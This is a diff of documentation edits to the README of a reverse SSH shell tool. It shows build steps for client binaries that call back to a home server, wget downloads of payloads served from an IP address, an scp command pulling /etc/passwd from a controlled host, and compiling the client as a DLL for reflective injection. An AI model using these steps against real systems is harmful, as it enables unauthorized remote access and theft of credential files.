@@ -86,15 +86,16 @@ make
 ```
 
 Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corresponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.
-If you need to build the client for a different architecture.
+
+Golang allows your to effortlessly cross compile, the following is an example for building windows:
 
 ```sh
-GOOS=linux GOARCH=amd64 make client
 GOOS=windows GOARCH=amd64 make client # will create client.exe
 ```
 
-You will need to create an `authorized_keys` file, containing *your* public key.
-This will allow you to control whatever server catches.
+You will need to create an `authorized_keys` file much like the ssh http://man.he.net/man5/authorized_keys, this contains *your* public key.
+This will allow you to connect to the RSSH server.
+
 Alternatively, you can use the --authorizedkeys flag to point to a file.
 
 ```sh
@@ -145,7 +146,7 @@ scp -J youserver.com:3232 root.wombo:/etc/passwd .
 
 ### Default Server
 
-At build time, you can specify a default server for the client binary to connect to:
+Specify a default server at build time:
 
 ```sh
 $ RSSH_HOMESERVER=localhost:1234 make
@@ -159,7 +160,7 @@ $ bin/client example.com:1234
 
 ### Built in Web Server
 
-The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be places in the project `bin/` folder, otherwise it cannot find source for the client.
+The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be placed in the project `bin/` folder, as it needs to find the client source.
 
 ```sh
 # Homeserver_address sets the default baked in call back for the client
@@ -189,7 +190,7 @@ http://192.168.122.1:1234/test
 
 ```
 
-Then you can download it as follows
+Then you can download it as follows:
 
 ```sh
 wget http://192.168.122.1:1234/test
@@ -199,13 +200,13 @@ chmod +x test
 ### Windows DLL Generation 
 
 You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
-This will need a cross compiler if you are doing this on linux, I used `mingw-w64-gcc` from the the archlinux main repo.
+This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`. 
 
 ```bash
 CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
 ```
 
-This can also be compile when the server has webserver support enabled. 
+When the RSSH server has the webserver enabled you can also compile it with the link command: 
 
 ```
 # Homeserver_address sets the default baked in call back for the client
